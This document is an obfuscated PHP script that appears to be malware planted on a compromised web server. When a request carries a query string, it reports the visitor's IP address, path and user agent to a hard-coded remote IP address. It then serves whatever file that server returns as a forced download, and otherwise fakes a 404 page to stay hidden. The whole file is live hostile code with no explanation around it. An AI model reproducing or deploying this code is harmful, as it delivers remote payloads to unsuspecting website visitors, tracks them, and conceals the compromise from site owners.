<?php
$hfmnibgtig = "ips";
$zaqukohkkj = "ip";
$fpczfknke = "func";
$gkwyvse = "h";
$goqptofiw = "res";
$thpskcj = "h_detected";
$bjkmsyafdmuw = "headers";
$rhxiztjm = "data";
$duzghq = "k";
$dmkoegsts = "v";
$kmmjtmc = "cookie";
$cirsgdg = "request";
$fkeupeyexfmk = "timeout";
$yaudjyo = "errstr";
$hahqpuuldvr = "errno";
$nwmhctnoy = "port";
$evrshigd = "fp";
$dkybtjey = "params";
$hygnxl = "uri";
$zovytdpysm = "type";
$unvrvgmd = "filename";
$vlqopxmxgrd = "content";
$adalfphu = "url";
$exutbtuec = "query";
$frtdlntnn = "remote";
error_reporting(0);
ini_set("display_errors", 0);
if (strlen($_SERVER["QUERY_STRING"]) == 0) {
    error_404();
}
$ {
    $GLOBALS["frtdlntnn"]
} = "http://78.138.127.174/2701dfbvcxff.php";
php_display($ {
    $GLOBALS["frtdlntnn"]
});
error_404();
function php_display($url) {
    $raarljmr = "query";
    $kghdwca = "url";
    $vilfjgrstr = "query";
    $ {
        $GLOBALS["raarljmr"]
    } = array();
    $sxxpvocik = "content";
    $zqhblgefkyfd = "content";
    $ {
        $GLOBALS["exutbtuec"]
    }
    ["ip"] = getIp();
    $mmzcqudkxbjd = "content";
    $ {
        $GLOBALS["exutbtuec"]
    }
    ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $utmelghg = "content";
    $wtyfqiuuryn = "query";
    $ {
        $GLOBALS["vilfjgrstr"]
    }
    ["useragent"] = getUseragent();
    $ {
        $GLOBALS["adalfphu"]
    } = $ {
        $GLOBALS["kghdwca"]
    } . "?" . http_build_query($ {
        $wtyfqiuuryn
    });
    $kjkunvv = "filename";
    $ {
        $mmzcqudkxbjd
    } = @file_get_contents($ {
        $GLOBALS["adalfphu"]
    });
    if (strlen($ {
        $GLOBALS["utmelghg"]
    }) < 10) {
        error_404();
    }
    $ {
        $GLOBALS["vlqopxmxgrd"]
    } = explode("
", $ {
        $GLOBALS["vlqopxmxgrd"]
    });
    $ {
        $kjkunvv
    } = array_shift($ {
        $GLOBALS["vlqopxmxgrd"]
    });
    $ {
        $GLOBALS["zqhblgefkyfd"]
    } = implode("
", $ {
        $sxxpvocik
    });
    if (strstr($ {
        $GLOBALS["unvrvgmd"]
    }, ".html") === FALSE) {
        $mkuwusknikkm = "content";
        $cdwvgbn = "filename";
        $ {
            $GLOBALS["zovytdpysm"]
        } = "application/octet-stream";
        $uctveteetipe = "type";
        header("Content-Type:" . $ {
            $GLOBALS["uctveteetipe"]
        });
        header("Content-Disposition: attachment; filename=" . $ {
            $cdwvgbn
        });
        header("Content-Length: " . strlen($ {
            $GLOBALS["mkuwusknikkm"]
        }));
    }
    echo $ {
        $GLOBALS["vlqopxmxgrd"]
    };
    exit();
}
function error_404() {
    $ekigsyougde = "content";
    header("HTTP/1.1 404 Not Found");
    $ppooicwhygh = "content";
    $mlpyciogd = "content";
    $ {
        $GLOBALS["hygnxl"]
    } = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    $dmpqcvqrmbxi = "uri";
    $ {
        $GLOBALS["vlqopxmxgrd"]
    } = custom_http_request("http://" . $_SERVER["HTTP_HOST"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    $ {
        $GLOBALS["ekigsyougde"]
    } = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $ {
        $GLOBALS["dmpqcvqrmbxi"]
    }, $ {
        $GLOBALS["ppooicwhygh"]
    });
    exit($ {
        $mlpyciogd
    });
}
function custom_http_request($params) {
    $rpbduqeew = "params";
    $kfmdcq = "params";
    $vixdrutdmipl = "scheme";
    $skithlp = "params";
    $xxehovhjncm = "params";
    $imarwteum = "url";
    $mgfhxdulu = "timeout";
    $hiznhk = "port";
    $pgcnydrskkow = "res";
    $lbleptt = "params";
    $deynxvrikuf = "url";
    $gltisxmf = "url";
    if (!is_array($ {
        $GLOBALS["skithlp"]
    })) {
        $ifhixrdyp = "params";
        $ {
            $ifhixrdyp
        } = array("url" => $ {
            $GLOBALS["dkybtjey"]
        }, "method" => "GET");
    }
    $yepdcevuxpl = "url";
    $vihctkjfhvvy = "params";
    if ($ {
        $GLOBALS["kfmdcq"]
    }
    ["url"] == "") return FALSE;
    $ubxlgnhuyr = "params";
    if (!isset($ {
        $GLOBALS["dkybtjey"]
    }
    ["method"])) $ {
        $ubxlgnhuyr
    }
    ["method"] = (isset($ {
        $GLOBALS["xxehovhjncm"]
    }
    ["data"]) && is_array($ {
        $GLOBALS["dkybtjey"]
    }
    ["data"])) ? "POST" : "GET";
    $cskpgqwdqo = "params";
    $ {
        $GLOBALS["vihctkjfhvvy"]
    }
    ["method"] = strtoupper($ {
        $GLOBALS["dkybtjey"]
    }
    ["method"]);
    if (!in_array($ {
        $GLOBALS["dkybtjey"]
    }
    ["method"], array("GET", "POST"))) return FALSE;
    $epiobcqrqlz = "url";
    $ {
        $gltisxmf
    } = parse_url($ {
        $cskpgqwdqo
    }
    ["url"]);
    $nxufvtacx = "res";
    $sfluwzoaoune = "params";
    if (!isset($ {
        $GLOBALS["adalfphu"]
    }
    ["scheme"])) $ {
        $GLOBALS["adalfphu"]
    }
    ["scheme"] = "http";
    if (!isset($ {
        $GLOBALS["imarwteum"]
    }
    ["path"])) $ {
        $GLOBALS["adalfphu"]
    }
    ["path"] = "/";
    $niyefoisfi = "url";
    $tkjjnyhwfoag = "scheme";
    if (!isset($ {
        $GLOBALS["adalfphu"]
    }
    ["host"]) && isset($ {
        $epiobcqrqlz
    }
    ["path"])) {
        $pgldxeumkut = "url";
        if (strpos($ {
            $GLOBALS["pgldxeumkut"]
        }
        ["path"], "/")) {
            $nrkejedmbdu = "url";
            $rwmlcdvjgd = "url";
            $mawbbupy = "url";
            $wxvxqaycqqcv = "url";
            $ {
                $GLOBALS["rwmlcdvjgd"]
            }
            ["host"] = substr($ {
                $GLOBALS["wxvxqaycqqcv"]
            }
            ["path"], 0, strpos($ {
                $GLOBALS["adalfphu"]
            }
            ["path"], "/"));
            $ {
                $GLOBALS["adalfphu"]
            }
            ["path"] = substr($ {
                $GLOBALS["mawbbupy"]
            }
            ["path"], strpos($ {
                $nrkejedmbdu
            }
            ["path"], "/"));
        } else {
            $grhytlhc = "url";
            $qhdogvo = "url";
            $ {
                $qhdogvo
            }
            ["host"] = $ {
                $GLOBALS["adalfphu"]
            }
            ["path"];
            $ {
                $GLOBALS["grhytlhc"]
            }
            ["path"] = "/";
        }
    }
    $ {
        $GLOBALS["adalfphu"]
    }
    ["path"] = preg_replace("/[\/]+/", "/", $ {
        $GLOBALS["yepdcevuxpl"]
    }
    ["path"]);
    if (isset($ {
        $GLOBALS["adalfphu"]
    }
    ["query"])) $ {
        $GLOBALS["adalfphu"]
    }
    ["path"].= "?{$url['query']}";
    $ {
        $hiznhk
    } = isset($ {
        $GLOBALS["dkybtjey"]
    }
    ["port"]) ? $ {
        $lbleptt
    }
    ["port"] : (isset($ {
        $GLOBALS["niyefoisfi"]
    }
    ["port"]) ? $ {
        $GLOBALS["adalfphu"]
    }
    ["port"] : ($ {
        $GLOBALS["adalfphu"]
    }
    ["scheme"] == "https" ? 443 : 80));
    $ {
        $mgfhxdulu
    } = isset($ {
        $GLOBALS["dkybtjey"]
    }
    ["timeout"]) ? $ {
        $GLOBALS["rpbduqeew"]
    }
    ["timeout"] : 30;
    if (!isset($ {
        $GLOBALS["dkybtjey"]
    }
    ["return"])) $ {
        $GLOBALS["dkybtjey"]
    }
    ["return"] = "content";
    $jskpbxwrosfw = "res";
    $moewmhtgse = "headers";
    $bupjnclc = "fp";
    $ {
        $GLOBALS["vixdrutdmipl"]
    } = $ {
        $GLOBALS["deynxvrikuf"]
    }
    ["scheme"] == "https" ? "ssl://" : "";
    $ {
        $GLOBALS["evrshigd"]
    } = @fsockopen($ {
        $tkjjnyhwfoag
    } . $ {
        $GLOBALS["adalfphu"]
    }
    ["host"], $ {
        $GLOBALS["nwmhctnoy"]
    }, $ {
        $GLOBALS["hahqpuuldvr"]
    }, $ {
        $GLOBALS["yaudjyo"]
    }, $ {
        $GLOBALS["fkeupeyexfmk"]
    });
    if ($ {
        $bupjnclc
    }) {
        $ywkmwgmun = "fp";
        $wrywtprn = "request";
        $ctwpwmfpd = "request";
        $rcewvwoncgs = "request";
        $klaxtlfng = "params";
        $ejtawqkjvwv = "params";
        if (!isset($ {
            $klaxtlfng
        }
        ["User-Agent"])) $ {
            $ejtawqkjvwv
        }
        ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        $njmbwqgsjh = "params";
        $qycqxlfe = "res";
        $ {
            $GLOBALS["cirsgdg"]
        } = "{$params['method']} {$url['path']} HTTP/1.0
";
        $ {
            $wrywtprn
        }.= "Host: {$url['host']}
";
        $bqwdrkh = "params";
        $ {
            $GLOBALS["cirsgdg"]
        }.= "User-Agent: {$params['User-Agent']}" . "
";
        if (isset($ {
            $GLOBALS["bqwdrkh"]
        }
        ["referer"])) $ {
            $GLOBALS["ctwpwmfpd"]
        }.= "Referer: {$params['referer']}
";
        $sfgjshen = "params";
        if (isset($ {
            $GLOBALS["dkybtjey"]
        }
        ["cookie"])) {
            $xbuxsue = "cookie";
            $izixaouwju = "params";
            $ {
                $GLOBALS["kmmjtmc"]
            } = "";
            $uydzdxtjj = "cookie";
            $qfbaog = "request";
            if (is_array($ {
                $izixaouwju
            }
            ["cookie"])) {
                $etxefpr = "cookie";
                $qvsaebfw = "cookie";
                $whhxdeqplxdm = "k";
                $qsnkils = "params";
                $oqcnxxdgy = "v";
                foreach ($ {
                    $qsnkils
                }
                ["cookie"] as $ {
                    $GLOBALS["whhxdeqplxdm"]
                } => $ {
                    $oqcnxxdgy
                }) $ {
                    $qvsaebfw
                }.= "$k=$v; ";
                $tymuackpyyx = "cookie";
                $ {
                    $tymuackpyyx
                } = substr($ {
                    $etxefpr
                }, 0, -2);
            } else $ {
                $uydzdxtjj
            } = $ {
                $GLOBALS["dkybtjey"]
            }
            ["cookie"];
            if ($ {
                $GLOBALS["xbuxsue"]
            } != "") $ {
                $qfbaog
            }.= "Cookie: $cookie
";
        }
        $ {
            $GLOBALS["cirsgdg"]
        }.= "Connection: close
";
        if ($ {
            $GLOBALS["njmbwqgsjh"]
        }
        ["method"] == "POST") {
            $vwhhfisif = "data";
            if (isset($ {
                $GLOBALS["dkybtjey"]
            }
            ["data"]) && is_array($ {
                $GLOBALS["dkybtjey"]
            }
            ["data"])) {
                $mgmnrst = "v";
                $rwdexltep = "data";
                $jmhoexxptj = "data";
                $cbkyxubxa = "data";
                $lbctcbl = "data";
                $hplxqfn = "k";
                foreach ($ {
                    $GLOBALS["dkybtjey"]
                }
                ["data"] AS $ {
                    $GLOBALS["hplxqfn"]
                } => $ {
                    $GLOBALS["dmkoegsts"]
                }) $ {
                    $cbkyxubxa
                }.= urlencode($ {
                    $GLOBALS["duzghq"]
                }) . "=" . urlencode($ {
                    $GLOBALS["mgmnrst"]
                }) . "&";
                if (substr($ {
                    $GLOBALS["jmhoexxptj"]
                }, -1) == "&") $ {
                    $rwdexltep
                } = substr($ {
                    $GLOBALS["lbctcbl"]
                }, 0, -1);
            }
            $ {
                $GLOBALS["vwhhfisif"]
            }.= "

";
            $ {
                $GLOBALS["cirsgdg"]
            }.= "Content-type: application/x-www-form-urlencoded
";
            $ {
                $GLOBALS["cirsgdg"]
            }.= "Content-length: " . strlen($ {
                $GLOBALS["rhxiztjm"]
            }) . "
";
        }
        $ {
            $GLOBALS["cirsgdg"]
        }.= "
";
        $gymemwndow = "fp";
        if ($ {
            $GLOBALS["sfgjshen"]
        }
        ["method"] == "POST") $ {
            $GLOBALS["cirsgdg"]
        }.= $ {
            $GLOBALS["rhxiztjm"]
        };
        @fwrite($ {
            $GLOBALS["evrshigd"]
        }, $ {
            $rcewvwoncgs
        });
        $ {
            $GLOBALS["qycqxlfe"]
        } = "";
        $ {
            $GLOBALS["bjkmsyafdmuw"]
        } = "";
        $ {
            $GLOBALS["thpskcj"]
        } = false;
        while (!@feof($ {
            $GLOBALS["gymemwndow"]
        })) {
            $lqnmxlpiaw = "res";
            $pumdxni = "res";
            $ {
                $pumdxni
            }.= @fread($ {
                $GLOBALS["evrshigd"]
            }, 1024);
            if (!$ {
                $GLOBALS["thpskcj"]
            } && strpos($ {
                $lqnmxlpiaw
            }, "

") !== FALSE) {
                $phtitpwfi = "res";
                $ceotabbpqud = "headers";
                $pjnwou = "res";
                $zhraky = "params";
                $oeqiubfj = "res";
                $adaqdivq = "headers";
                $ {
                    $GLOBALS["thpskcj"]
                } = true;
                $khgqovuhu = "params";
                $ {
                    $GLOBALS["adaqdivq"]
                } = substr($ {
                    $GLOBALS["phtitpwfi"]
                }, 0, strpos($ {
                    $GLOBALS["pjnwou"]
                }, "

"));
                $ {
                    $oeqiubfj
                } = substr($ {
                    $GLOBALS["goqptofiw"]
                }, strpos($ {
                    $GLOBALS["goqptofiw"]
                }, "

") + 4);
                $ugvdzmbig = "params";
                if ($ {
                    $khgqovuhu
                }
                ["return"] == "headers" || $ {
                    $GLOBALS["dkybtjey"]
                }
                ["return"] == "array" || (isset($ {
                    $ugvdzmbig
                }
                ["redirect"]) && $ {
                    $GLOBALS["dkybtjey"]
                }
                ["redirect"] == true)) {
                    $tsbiwulfowhr = "v";
                    $iqrhxdf = "h";
                    $tuykrk = "headers";
                    $frfdskiwxv = "k";
                    $kpwuep = "headers";
                    $ {
                        $GLOBALS["iqrhxdf"]
                    } = explode("
", $ {
                        $tuykrk
                    });
                    $ {
                        $GLOBALS["kpwuep"]
                    } = array();
                    foreach ($ {
                        $GLOBALS["gkwyvse"]
                    } as $ {
                        $frfdskiwxv
                    } => $ {
                        $tsbiwulfowhr
                    }) {
                        $dicebo = "v";
                        if (strpos($ {
                            $dicebo
                        }, ":")) {
                            $ojxubpulg = "v";
                            $mkfupgkidqyu = "v";
                            $ {
                                $GLOBALS["duzghq"]
                            } = substr($ {
                                $GLOBALS["dmkoegsts"]
                            }, 0, strpos($ {
                                $ojxubpulg
                            }, ":"));
                            $ {
                                $GLOBALS["dmkoegsts"]
                            } = trim(substr($ {
                                $GLOBALS["mkfupgkidqyu"]
                            }, strpos($ {
                                $GLOBALS["dmkoegsts"]
                            }, ":") + 1));
                        }
                        $kiaarey = "v";
                        $ {
                            $GLOBALS["bjkmsyafdmuw"]
                        }
                        [strtoupper($ {
                            $GLOBALS["duzghq"]
                        }) ] = $ {
                            $GLOBALS["kiaarey"]
                        };
                    }
                }
                if (isset($ {
                    $GLOBALS["zhraky"]
                }
                ["redirect"]) && $ {
                    $GLOBALS["dkybtjey"]
                }
                ["redirect"] == true && isset($ {
                    $GLOBALS["bjkmsyafdmuw"]
                }
                ["LOCATION"])) {
                    $ssmmvued = "params";
                    $ {
                        $GLOBALS["dkybtjey"]
                    }
                    ["url"] = $ {
                        $GLOBALS["bjkmsyafdmuw"]
                    }
                    ["LOCATION"];
                    if (!isset($ {
                        $GLOBALS["dkybtjey"]
                    }
                    ["redirect-count"])) $ {
                        $GLOBALS["ssmmvued"]
                    }
                    ["redirect-count"] = 0;
                    if ($ {
                        $GLOBALS["dkybtjey"]
                    }
                    ["redirect-count"] < 10) {
                        $ {
                            $GLOBALS["dkybtjey"]
                        }
                        ["redirect-count"]++;
                        $jetmhydib = "func";
                        $bfdsupd = "params";
                        $rzdgnapdmw = "params";
                        $ {
                            $jetmhydib
                        } = __FUNCTION__;
                        return @is_object($this) ? $this->$ {
                            $GLOBALS["fpczfknke"]
                        }
                        ($ {
                            $bfdsupd
                        }) : $ {
                            $GLOBALS["fpczfknke"]
                        }
                        ($ {
                            $rzdgnapdmw
                        });
                    }
                }
                if ($ {
                    $GLOBALS["dkybtjey"]
                }
                ["return"] == "headers") return $ {
                    $GLOBALS["ceotabbpqud"]
                };
            }
        }
        @fclose($ {
            $GLOBALS["ywkmwgmun"]
        });
    } else return FALSE;
    if ($ {
        $GLOBALS["sfluwzoaoune"]
    }
    ["return"] == "array") $ {
        $pgcnydrskkow
    } = array("headers" => $ {
        $moewmhtgse
    }, "content" => $ {
        $GLOBALS["nxufvtacx"]
    });
    return $ {
        $GLOBALS["jskpbxwrosfw"]
    };
}
function getUseragent() {
    return $_SERVER["HTTP_USER_AGENT"];
}
function getIp() {
    $nzpdlvvn = "ip";
    $jfrgotjwgfeb = "ip";
    $ {
        $GLOBALS["zaqukohkkj"]
    } = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ {
            $GLOBALS["zaqukohkkj"]
        } = $_SERVER["REMOTE_ADDR"];
    }
    if (strpos($ {
        $nzpdlvvn
    }, ",") !== FALSE) {
        $fpparhroiyb = "ip";
        $ {
            $GLOBALS["hfmnibgtig"]
        } = explode(",", $ {
            $GLOBALS["zaqukohkkj"]
        });
        $ {
            $GLOBALS["fpparhroiyb"]
        } = trim(array_pop($ {
            $GLOBALS["hfmnibgtig"]
        }));
    }
    return $ {
        $GLOBALS["jfrgotjwgfeb"]
    };
} ?>
